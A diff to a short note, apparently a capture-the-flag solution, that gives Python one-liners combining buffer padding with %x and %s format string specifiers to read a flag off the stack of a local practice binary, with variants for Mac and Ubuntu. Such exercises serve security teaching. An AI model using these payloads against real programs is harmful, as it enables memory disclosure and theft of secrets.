@@ -1,5 +1,10 @@
-Basic format string attack and buffer overflow:
+Basic format string attack and buffer overflow
+However, this will work differently depending on the OS because of the way the compiler assigns values to the stack.
 
-python -c "print 'A'*64 + '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s'" | ./a.out
+On Macs:
+python -c "print 'A'*32 + '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s'" | ./a.out
+
+On Ubuntu:
+python -c "print 'A'*32 + '%x.%x.%x.%s'" | ./a.out
 
 First overflow the 64 char name buffer and then pop values off the stack using the %x string formatting character until you get to the flag, in which you use the %s formatting character.
